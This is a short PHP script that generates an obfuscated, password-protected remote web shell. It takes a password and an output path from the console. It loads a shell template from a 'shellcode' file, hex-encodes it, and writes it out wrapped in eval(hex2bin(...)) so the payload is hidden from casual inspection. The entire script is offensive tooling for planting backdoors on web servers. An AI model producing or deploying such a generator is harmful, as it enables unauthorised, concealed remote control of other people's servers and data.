<?php
print "Set Password: ";
$inputs = fopen("php://stdin","r");
$input = fgets($inputs);
   $password = trim(md5($input));
fclose($inputs);

print "Set Location save: ";
$inputs = fopen("php://stdin","r");
$input = fgets($inputs);
   $location = trim($input);
   $body = file_get_contents("shellcode/remoteshell.code", true);
   $body = str_replace("password_change", $password, $body);
   $body = bin2hex($body);
   $body = "<?php eval(hex2bin('".$body."'));";
   $fp = fopen($location, 'w');
   fwrite($fp, $body);
   fclose($fp);
   if(file_exists($location)){
      print "[*] Success generate remote shell -> ".$location;
   }else{
      print "[!] Failed generate remoteshell";
   }
fclose($inputs);
?>